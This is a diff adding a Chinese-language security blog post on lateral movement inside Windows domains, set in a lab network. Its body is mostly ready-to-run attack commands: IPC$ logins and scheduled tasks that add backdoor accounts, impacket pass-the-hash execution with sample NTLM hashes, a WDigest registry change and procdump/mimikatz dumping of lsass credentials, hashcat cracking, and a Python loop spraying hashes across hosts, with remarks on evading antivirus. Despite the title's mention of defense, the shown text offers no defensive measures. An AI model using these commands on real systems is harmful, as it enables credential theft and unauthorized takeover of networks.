@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="域内的横向移动方法总结和防御思路">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域内横向移动分析及防御">
+<meta property="og:url" content="http://example.com/2022/02/24/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1/index.html">
+<meta property="og:site_name" content="Spring&#39;blog">
+<meta property="og:description" content="域内的横向移动方法总结和防御思路">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220322123656870-1648900544415.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1631613860069-8e221a7f-cc0e-42a1-bca6-f539628e6ade.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220324181713883-1648902585363.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1633082373154-ffa7b109-6ace-41f5-a049-838bb9ff396a.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1619426447_60867c8fe216c15746570.png!small">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1619426455_60867c97e96a2a6198ef7.png!small">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1619426466_60867ca238d655b2c033f.png!small">
+<meta property="article:published_time" content="2022-02-24T08:24:02.000Z">
+<meta property="article:modified_time" content="2022-04-08T05:09:32.869Z">
+<meta property="article:author" content="Spring">
+<meta property="article:tag" content="域内横向">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220322123656870-1648900544415.png">
+
+<link rel="canonical" href="http://example.com/2022/02/24/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>域内横向移动分析及防御 | Spring'blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Spring'blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">我还年轻，吃苦趁现在。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">14</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/24/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Spring">
+      <meta itemprop="description" content="见到一座山，就想知道山后面是什么。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Spring'blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          域内横向移动分析及防御
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-24 16:24:02" itemprop="dateCreated datePublished" datetime="2022-02-24T16:24:02+08:00">2022-02-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-08 13:09:32" itemprop="dateModified" datetime="2022-04-08T13:09:32+08:00">2022-04-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91/" itemprop="url" rel="index"><span itemprop="name">内网</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">域内的横向移动方法总结和防御思路</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <span id="more"></span>
+
+<h1 id="域横向批量at-amp-schtasks-amp-impacket"><a href="#域横向批量at-amp-schtasks-amp-impacket" class="headerlink" title="域横向批量at&amp;schtasks&amp;impacket"></a>域横向批量at&amp;schtasks&amp;impacket</h1><h2 id="横向渗透明文传递-at-amp-schtasks"><a href="#横向渗透明文传递-at-amp-schtasks" class="headerlink" title="横向渗透明文传递 at&amp;schtasks"></a>横向渗透明文传递 at&amp;schtasks</h2><p>at&amp;schtasks命令，已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。<br>获取到某域的主机权限-&gt;minikatz 得到密码（明文，hash）-&gt;用信息搜集里面的域用户的列表当作用户名字典-&gt;用到密码明文当作密码字典-&gt;尝试连接-&gt;创建计划任务-&gt;执行文件可为后门或者相关命令</p>
+<p>利用流程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.建立IPC连接到目标主机(ipc通过验证用户名密码，获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用)</span><br><span class="line">	利用条件：（1）开启139、445端口（2）管理员开启了默认共享</span><br><span class="line">2.拷贝要执行的命令脚本到目标主机</span><br><span class="line">3.查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</span><br><span class="line">4.删除ipc连接</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 工作组</span><br><span class="line">net use \\server\ipc$&quot;password&quot; /user:username</span><br><span class="line">#域内</span><br><span class="line">net use \\server\ipc$&quot;password&quot; /user:domain\username</span><br><span class="line"># 查看文件列表</span><br><span class="line">dir \\xx.xx.xx.xx\C$\</span><br><span class="line"># 下载文件</span><br><span class="line">copy \\xx.xx.xx.xx\C$\1.bat 1.bat</span><br><span class="line"># 复制文件</span><br><span class="line">copy 1.bat \\xx.xx.xx.xx\C$</span><br><span class="line"># 删除 IPC</span><br><span class="line">net use \\xx.xx.xx.xx\C$\1.bat /del</span><br><span class="line"># 查看对方共享</span><br><span class="line">net view xx.xx.xx.xx</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">at &lt; Windows2012</span><br><span class="line"># 建立 ipc 连接：</span><br><span class="line">	net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\ad ministrator</span><br><span class="line"># 拷贝执行文件到目标机器</span><br><span class="line">	copy add.bat \\192.168.3.21\c$</span><br><span class="line"># add.bat </span><br><span class="line">	net user xiaodi qwe123!@#X. /add</span><br><span class="line">#添加计划任务</span><br><span class="line">	at \\192.168.3.21 15:47 c:\add.bat </span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">schtasks &gt;=Windows2012</span><br><span class="line"># 建立 ipc 连接：</span><br><span class="line">net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\administrator //不行把god.org\删除</span><br><span class="line"># 复制文件到其 C 盘</span><br><span class="line">copy add.bat \\192.168.3.32\c$ </span><br><span class="line"># 创建 adduser 任务 对应执行文件</span><br><span class="line">schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F </span><br><span class="line"># 运行 adduser 任务</span><br><span class="line">schtasks /run /s 192.168.3.32 /tn adduser /i</span><br><span class="line"># 删除 adduser 任务</span><br><span class="line">schtasks /delete /s 192.168.3.21 /tn adduser /f</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="横向渗透明文HASH传递atexec-impacket"><a href="#横向渗透明文HASH传递atexec-impacket" class="headerlink" title="横向渗透明文HASH传递atexec-impacket"></a>横向渗透明文HASH传递atexec-impacket</h2><p>通过用impacket网络协议工具包的atexec.exe的命令来进行攻击，需要免杀，第三方工具。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot; （本地的）</span><br><span class="line">atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot; （域用户）</span><br><span class="line">atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="横向渗透明文HASH传递批量利用-综合"><a href="#横向渗透明文HASH传递批量利用-综合" class="headerlink" title="横向渗透明文HASH传递批量利用-综合"></a>横向渗透明文HASH传递批量利用-综合</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#批量检测 IP 对应明文连接</span><br><span class="line">FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ &quot;admin!@#45&quot; /user:administrator</span><br><span class="line">#批量检测 IP 对应明文 回显版</span><br><span class="line">FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami</span><br><span class="line">#批量检测明文对应 IP 回显版</span><br><span class="line">FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami</span><br><span class="line"># 批量检测 HASH 对应 IP 回显版</span><br><span class="line">FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="横向渗透明文HASH传递批量利用-升级版"><a href="#横向渗透明文HASH传递批量利用-升级版" class="headerlink" title="横向渗透明文HASH传递批量利用-升级版"></a>横向渗透明文HASH传递批量利用-升级版</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller（将.py文件生成为.exe文件）</span><br><span class="line">pyinstaller -F fuck_neiwang_001.py（生成.exe文件）</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="域横向smb-amp-wmi明文或hash传递"><a href="#域横向smb-amp-wmi明文或hash传递" class="headerlink" title="域横向smb&amp;wmi明文或hash传递"></a>域横向smb&amp;wmi明文或hash传递</h1><h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h2><p>windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码<br>windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码</p>
+<p>针对以上情况，有4种方案解决问题<br>    1.利用hash传递（pth、ptk等）进行移动<br>    2.利用其它服务协议（SMB、WMI等）哈希移动<br>    （以上是无法获取明文的方法，以下是获取明文的方法）<br>    3.利用注册表操作开启Wdigest Auth值进行获取<br>    4.利用工具或第三方平台（Hachcat）进行破解获取（看自己字典了）</p>
+<p>windows系统LM Hash及NTLM Hash加密算法，个人系统在windows vista后，服务器系统在 windows 2003以后，认证方式均为NTLM Hash。</p>
+<p>注册表修改（当目标为win10或2012R2以上时默认在内存缓存中禁止保存明文密码但可以通过修改注册表的方式抓取明文）<br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br>#重启或用户重新登录后可以成功抓取</p>
+<h2 id="Procdump-Mimikatz配合获取"><a href="#Procdump-Mimikatz配合获取" class="headerlink" title="Procdump+Mimikatz配合获取"></a>Procdump+Mimikatz配合获取</h2><p>使用背景：<br>如果上传minikaze被杀，可以使用这个方法，因为procdump是windows官方的软件<br>1.将procdump上传到对面服务器，运行procdump，在当前目录下生成lsass.dmp文件<br>    procdump.exe -accepteula -ma lsass.exe lsass.dmp<br>2.本地minikaze还原lsass.dmp文件<br>    privilege::debug（权限提升）<br>    sekurlas::minidump lsass.dmp（载入文件）<br>    sekurlas::logonPasswords full（读取密码）</p>
+<h2 id="Hashcat破解获取windows-NTML-Hash"><a href="#Hashcat破解获取windows-NTML-Hash" class="headerlink" title="Hashcat破解获取windows NTML Hash"></a>Hashcat破解获取windows NTML Hash</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a0  -m 1000 hash file --force</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="域横向移动SMB服务利用-psexec-smbexec-官方自带"><a href="#域横向移动SMB服务利用-psexec-smbexec-官方自带" class="headerlink" title="域横向移动SMB服务利用-psexec,smbexec(官方自带)"></a>域横向移动SMB服务利用-psexec,smbexec(官方自带)</h2><p>利用SMB服务可以通过明文或hash传递来远程执行，条件445端口开放</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">psexec第一种：先有ipc链接，psexec需要明文或hash传递</span><br><span class="line">	net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administrator</span><br><span class="line">	# 需要先有 ipc 链接 -s 以 System 权限运行</span><br><span class="line">	psexec \\192.168.3.32 -s cmd </span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">psexec第二种：不用建立ipc直接提供明文账号密码</span><br><span class="line">psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd</span><br><span class="line"># 官方 Pstools 无法 采用 hash 连接</span><br><span class="line"># 非官方自带-参考 impacket 工具包使用，操作简单，容易被杀</span><br><span class="line">psexec -hashes :$HASH$ ./administrator@10.1.2.3</span><br><span class="line">psexec -hashes :$HASH$ domain/administrator@10.1.2.3</span><br><span class="line">psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 </span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbexec 无需建立ipc链接 明文或hash传递（第三方库）</span><br><span class="line">smbexec god/administrator:Admin12345@192.168.3.21（域用户）</span><br><span class="line">smbexec ./administrator:admin!@#45@192.168.3.32（本地用户）</span><br><span class="line">smbexec -hashes :$HASH$ ./admin@192.168.3.21</span><br><span class="line">smbbexec -hashes :$HASH$ domain/admin@192.168.3.21</span><br><span class="line">smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class="line">smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="域横向移动WMI服务利用-cscript-wmiexec-wmic"><a href="#域横向移动WMI服务利用-cscript-wmiexec-wmic" class="headerlink" title="域横向移动WMI服务利用-cscript,wmiexec,wmic"></a>域横向移动WMI服务利用-cscript,wmiexec,wmic</h2><p>WMI(windows Management Instrumentation)时通过135端口进行利用,支持用户名明文或者hash的方式进行认证,并且该方法不会在目标日志系统留下痕迹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#自带WMIC 明文传递 无回显(缺点,功能比较尴尬)</span><br><span class="line">wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#自带cscript 明文传递，有回显，需要配合wmiexec.vbs</span><br><span class="line">cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">套件impacket wmiexec 明文或hash传递 有回显exe版本</span><br><span class="line">wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;</span><br><span class="line">wmiexec god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;</span><br><span class="line">wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;</span><br><span class="line">wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220322123656870-1648900544415.png" alt="image-20220322123656870"></p>
+<p>PTH,PTT,PTK支持hash，不需要考虑免杀。</p>
+<h2 id="域横向移动以上服务hash-批量利用-python-编译exe"><a href="#域横向移动以上服务hash-批量利用-python-编译exe" class="headerlink" title="域横向移动以上服务hash 批量利用-python 编译exe"></a>域横向移动以上服务hash 批量利用-python 编译exe</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.32&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">users=&#123;</span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;boss&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dbadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;fileadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mack&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">hashs=&#123;</span><br><span class="line">    <span class="string">&#x27;ccef208c6485269c20db2cad21734fe7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;518b98ad4178a53695dc997aa02d455c&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> mimahash <span class="keyword">in</span> hashs:</span><br><span class="line">            <span class="comment">#wmiexec -hashes :hashgod/user@ipwhoami</span></span><br><span class="line">            <span class="built_in">exec</span> = <span class="string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="string">&quot; god/&quot;</span>+user+<span class="string">&quot;@&quot;</span>+ip+<span class="string">&quot; whoami&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + <span class="built_in">exec</span> + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            os.system(<span class="built_in">exec</span>)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>) </span><br><span class="line">            exec1 = <span class="string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="string">&quot; god/&quot;</span>+user+<span class="string">&quot;@&quot;</span>+ip+<span class="string">&quot; whoami&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + exec1 + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            os.system(exec1)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="域横向PTH-amp-PTK-amp-PTT哈希票据传递"><a href="#域横向PTH-amp-PTK-amp-PTT哈希票据传递" class="headerlink" title="域横向PTH&amp;PTK&amp;PTT哈希票据传递"></a>域横向PTH&amp;PTK&amp;PTT哈希票据传递</h1><p>Kerberos协议具体工作方法，在域中，简要介绍一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">客户机将明文密码进行NTLM哈希,然后和时间戳一起加密(使用krbtgt密码 hash作为密钥)，发送给kdc(域控)，kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)</span><br><span class="line"></span><br><span class="line">将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据</span><br><span class="line"></span><br><span class="line">然后客户机将TGT发送给域控制器KDC请求TGS(票证授权服务）票证，并且对TGT进行检测</span><br><span class="line"></span><br><span class="line">检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">概念</span><br><span class="line">PTH(pass the hash)#利用LM或NTLM的值进行的渗透测试</span><br><span class="line">PTT(pass the ticket)#利用的票据凭证TGT进行的渗透测试</span><br><span class="line">PTK(pass the key)#利用的ekeys aes256进行的渗透测试</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PTH和PTK</span><br><span class="line">PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。</span><br><span class="line"></span><br><span class="line">如果禁用了ntlm认证，PsExec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1/2012r2，安装补丁kb2871997的 Win 7/2008r2/8/2012等，可以使用AES keys代替NT hash 来实现ptk攻击。</span><br></pre></td></tr></table></figure>
+
+
+
